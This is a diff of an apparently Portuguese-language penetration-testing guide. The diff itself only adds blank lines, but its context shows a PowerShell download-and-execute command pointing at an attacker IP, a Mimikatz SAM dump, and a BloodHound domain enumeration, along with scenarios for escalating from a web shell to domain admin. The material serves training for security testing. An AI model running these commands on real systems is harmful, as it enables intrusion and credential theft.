@@ -39,6 +39,7 @@ powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://[IP_atacante
 ```
 
 **Exemplo Prático de Aplicação:**
+
 - **Cenário:** Após obter uma *shell* reversa de baixo privilégio (www-data) em um servidor Linux através da exploração de um formulário de *upload* vulnerável, o analista precisa identificar rapidamente um caminho viável para escalonar privilégios até root, dentre as inúmeras possibilidades de má configuração em um sistema de produção real.
 - **Comando Executado:**
 
@@ -78,6 +79,7 @@ lsadump::sam
 ```
 
 **Exemplo Prático de Aplicação:**
+
 - **Cenário:** Após escalar privilégios para administrador local em um servidor Windows através da exploração de um serviço mal configurado, o analista sabe que um administrador de domínio realizou login recentemente naquela máquina (via RDP para uma tarefa de manutenção) e busca capturar essas credenciais privilegiadas em cache para obter acesso ao *Domain Controller*.
 - **Comandos Executados:**
 
@@ -115,6 +117,7 @@ bloodhound-python -u [usuario] -p [senha] -d [dominio.local] -ns [IP_do_DC] -c A
 ```
 
 **Exemplo Prático de Aplicação:**
+
 - **Cenário:** O analista comprometeu a conta de um usuário de domínio padrão, sem nenhum privilégio administrativo aparente, em uma rede corporativa com centenas de usuários e grupos aninhados. Ao invés de tentar exploração manual às cegas, o objetivo é identificar programaticamente se existe algum caminho de escalonamento (por mais indireto que seja) que leve a essa conta comprometida até o grupo Domain Admins.
 - **Execução Prática:** O analista executa bloodhound-python -u usuario.padrao -p 'SenhaValida123' -d alvo.local -ns 10.0.1.5 -c All para coletar os dados remotamente, e em seguida importa os arquivos JSON gerados na interface gráfica do BloodHound. Na aba de análise, seleciona o nó do usuário comprometido como nó inicial e o grupo DOMAIN ADMINS como nó final, executando a consulta pré-definida "Shortest Path to Domain Admins".
 - **Resultado Esperado:** O BloodHound renderizará visualmente uma cadeia de nós conectados, revelando, por exemplo, que o usuário comprometido pertence a um grupo aninhado que possui permissão *GenericAll* sobre outro usuário, que por sua vez está habilitado para *Constrained Delegation* em um serviço com privilégios de administrador de domínio. Essa cadeia visual fornece o roteiro exato e técnico dos comandos necessários (ex: via [Mimikatz](#62-mimikatz-v220) ou Rubeus) para escalar privilégios até o comprometimento total do domínio.
